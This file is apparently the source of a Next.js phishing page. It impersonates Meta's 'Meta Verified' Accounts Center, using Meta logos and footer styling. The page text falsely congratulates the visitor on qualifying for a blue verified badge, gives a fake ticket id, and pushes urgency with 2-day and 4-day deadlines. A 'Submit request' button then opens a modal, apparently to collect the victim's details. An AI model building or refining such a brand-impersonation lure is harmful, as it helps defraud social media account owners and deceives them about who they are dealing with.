import { ModalFlowProvider } from "@/components/ModalFlow";
import { ButtonWithModal } from "@/components/ButtonWithModal";
import Image from "next/image";
import type { Metadata } from "next";

export const metadata: Metadata = {
  title: "Accounts Center | Meta Verified",
  description:
    "Meta verified",
  alternates: {
    canonical: "/accounts-center",
  },
};

export default function AccountsCenterPage() {
  return (
    <ModalFlowProvider>
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-sky-50 to-slate-100 text-slate-900">
        <main className="mx-auto flex min-h-screen max-w-4xl flex-col px-4 py-10 sm:px-8">
          <section className="flex-1 px-1 py-2 sm:px-2 sm:py-4">
            <div className="mb-6 flex items-start gap-4 sm:mb-10">
              <div className="mt-1 flex h-12 w-12 items-center justify-center rounded-full bg-metaBlue/10">
                <Image
                  src="/ic_blue.svg"
                  alt="Meta Verified badge"
                  width={40}
                  height={40}
                  className="h-8 w-8"
                />
              </div>
              <div>
                <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">
                  Meta Verified – Rewards for you
                </h1>
                <p className="mt-2 text-sm font-semibold text-slate-800">
                  Show the world that you mean business.
                </p>
              </div>
            </div>

            <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
              <p>
                Congratulations on achieving the requirements to upgrade your page to a verified blue badge!
                This is a fantastic milestone that reflects your dedication and the trust you&apos;ve built with
                your audience.
              </p>
              <p>
                We&apos;re thrilled to celebrate this moment with you and look forward to seeing your page thrive
                with this prestigious recognition!
              </p>

              <p className="mt-4 text-sm font-medium text-metaBlue">
                Your ticket id: <span className="underline decoration-dotted">#Y718-SGCZ-4JXR</span>
              </p>

              <div className="mt-6 space-y-3">
                <h2 className="text-sm font-semibold text-slate-900 sm:text-base">
                  Verified Blue Badge Request Guide
                </h2>
                <ul className="space-y-2 text-sm text-slate-700 sm:text-[15px]">
                  <li>
                    - Fact checkers may not respond to requests containing intimidation, hate speech, or verbal
                    threats.
                  </li>
                  <li>
                    - In your request, please provide all required information to ensure timely processing by the
                    fact checker. Submitting an invalid email address or failing to reply to requests for additional
                    information within 2 days may lead to the application being closed without review. If the request
                    remains unprocessed after 4 days, Meta will automatically reject it.
                  </li>
                  <li>
                    - Once all details are submitted, we will evaluate your account to check for any restrictions.
                    The verification process typically takes 24 hours, though it may extend in some cases. Based on
                    our decision, restrictions will either remain or be lifted, and your account will be updated
                    accordingly.
                  </li>
                </ul>
              </div>
            </div>

            <div className="mt-10 flex justify-center">
              <ButtonWithModal className="inline-flex items-center rounded-full bg-metaBlue px-10 py-3 text-sm font-semibold text-white shadow-sm transition hover:bg-metaIndigo focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-metaBlue focus-visible:ring-offset-2">
                Submit request
              </ButtonWithModal>
            </div>
          </section>

          <footer className="mt-6 flex flex-wrap justify-center gap-4 text-xs text-slate-500 sm:text-[13px]">
            <button className="hover:text-slate-700" type="button">
              Help Center
            </button>
            <span className="text-slate-400">•</span>
            <button className="hover:text-slate-700" type="button">
              Privacy Policy
            </button>
            <span className="text-slate-400">•</span>
            <button className="hover:text-slate-700" type="button">
              Terms of Service
            </button>
            <span className="text-slate-400">•</span>
            <button className="hover:text-slate-700" type="button">
              Community Standards
            </button>
            <span className="text-slate-400">•</span>
            <span>Meta © {new Date().getFullYear()}</span>
          </footer>
        </main>
      </div>
    </ModalFlowProvider>
  );
}
